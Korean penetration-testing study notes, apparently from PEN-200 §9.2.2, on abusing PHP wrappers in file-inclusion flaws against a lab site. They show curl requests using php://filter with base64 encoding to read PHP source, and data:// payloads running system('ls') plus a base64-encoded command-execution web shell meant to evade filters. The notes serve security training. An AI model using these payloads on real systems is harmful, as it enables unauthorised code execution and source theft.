# 9.2.2 PHP 래퍼 활용

> **PHP Wrappers** · PEN-200 §9.2.2

PHP 는 언어 기능을 확장하는 여러 프로토콜 래퍼(wrapper)를 제공하며, 이를 통해 로컬·원격 파일 시스템을 표현하고 접근할 수 있음. **공격 관점에서는 필터를 우회하거나 PHP 애플리케이션의 파일 인클루전 취약점으로 코드 실행을 얻는 수단임.** 여기서 다루는 것은 `php://filter` 와 `data://` 둘이나 그 외에도 여러 개가 있음.

**`php://filter` — 파일 내용을 «실행하지 않고» 표시함.** ROT13·Base64 같은 인코딩을 적용하거나 적용하지 않고 내용을 낼 수 있음. 앞 절의 LFI 는 `.php` 를 포함시키면 «실행»해 버려 소스가 안 보이는데, 이 래퍼를 쓰면 **실행 파일의 소스를 그대로 읽어 민감 정보와 애플리케이션 로직을 분석할 수 있음.**

⚠️ 다만 실습이 보여주듯 **`resource=` 만 주면 소스가 보이지 않고 그대로 실행됨.** `.php` 소스를 꺼내려면 `convert.base64-encode` 같은 변환 필터를 반드시 함께 걸 것.

기준선부터 잡음. 실습 애플리케이션에서 `page=admin.php` 를 그냥 요청한 결과임.

```
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under
maintenance.
```

*래퍼 없이 `page=admin.php` 를 요청한 기준선 — 점검 안내 텍스트만 나오고 `<body>` 태그가 닫히지 않은 채 끝남*

**PHP 코드는 서버측에서 실행되므로 출력에 나타나지 않고, 그래서 뒷부분이 통째로 비어 보임.** 이전 인클루전 결과나 브라우저의 소스 보기와 비교하면 빠진 것이 `index.php` 페이지의 나머지 내용임을 알 수 있음. **이 기준선이 있어야 래퍼가 왜 필요한지가 성립함.**

래퍼의 필수 파라미터는 필터링할 파일 스트림을 지정하는 `resource` 이고 여기에 절대·상대 경로를 모두 쓸 수 있음. 인코딩 없이 부르면 결과가 평범한 LFI 와 같음 — PHP 코드가 포함돼 실행되기 때문임.

```
kali@kali:~$ curl
http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under
maintenance.
```

*인코딩 없이 `php://filter` 로 `admin.php` 포함 — 평범한 LFI 와 결과가 같음*

`convert.base64-encode` 를 붙이면 지정한 리소스가 base64 문자열로 변환됨. **실행 대신 인코딩을 거치므로 소스가 보존됨.**

**`data://` — 코드 실행용 래퍼임.** 데이터 요소를 평문이나 base64 로 실행 중인 애플리케이션 코드에 끼워 넣음. **로컬 파일을 오염시킬 수 없는 상황의 대안임.** 사용법은 `data://` 뒤에 데이터 타입과 내용을 붙이는 것이고, 아래는 URL 인코딩한 짧은 PHP 스니펫으로 `ls` 를 실행한 예임.

```
kali@kali:~$ curl
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20sy
stem('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php

css
fonts
img

...
```

*`data://` 래퍼로 `ls` 실행*

웹 애플리케이션 방화벽 등이 `system` 같은 문자열이나 PHP 코드 요소를 거를 수 있음. **이때는 스니펫을 base64 로 인코딩해 같은 래퍼로 넘김** — 기본적인 필터를 우회하는 수단임.

```
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
kali@kali:~$ curl
"http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZW
```

*base64 로 인코딩한 데이터를 `data://` 래퍼로 실행*

⚠️ **`data://` 래퍼는 기본 PHP 설치에서는 동작하지 않음.** 익스플로잇하려면 `allow_url_include` 설정이 켜져 있어야 함.
